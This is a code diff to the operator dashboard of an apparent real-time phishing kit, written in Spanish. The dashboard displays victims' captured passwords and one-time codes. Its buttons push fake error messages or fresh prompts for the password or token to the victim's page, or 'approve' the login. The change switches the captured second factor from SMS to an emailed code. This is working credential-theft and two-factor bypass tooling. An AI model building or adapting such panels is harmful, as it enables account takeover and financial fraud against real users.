@@ -107,13 +107,13 @@
           <span class="data-val pass">${escapeHtml(s.password || "—")}</span>
         </div>
         <div class="data-row">
-          <span class="data-label">📱 Código SMS Token</span>
+          <span class="data-label">📧 Código Correo</span>
           <span class="data-val token">${escapeHtml(s.token || "—")}</span>
         </div>
         <div class="actions-grid">
           <button class="cmd-btn btn-err-doc" onclick="sendCmd('${safeId}', 'wrong_doc', 'Documento incorrecto o no registrado')">❌ Err. Doc</button>
           <button class="cmd-btn btn-err-pass" onclick="sendCmd('${safeId}', 'wrong_pass', 'Contraseña incorrecta. Inténtalo de nuevo.')">🔑 Err. Clave</button>
-          <button class="cmd-btn btn-err-token" onclick="sendCmd('${safeId}', 'wrong_token', 'Código SMS inválido o expirado.')">📲 Err. SMS</button>
+          <button class="cmd-btn btn-err-token" onclick="sendCmd('${safeId}', 'wrong_token', 'Código de correo inválido o expirado.')">📧 Err. Código</button>
           <button class="cmd-btn btn-ask-pass" onclick="sendCmd('${safeId}', 'ask_pass', 'Pedir clave')">➡️ Pedir Clave</button>
           <button class="cmd-btn btn-ask-token" onclick="sendCmd('${safeId}', 'ask_token', 'Pedir token')">📱 Pedir Token</button>
           <button class="cmd-btn btn-approve" onclick="sendCmd('${safeId}', 'approve', 'Aprobar')">✅ Aprobar Login</button>
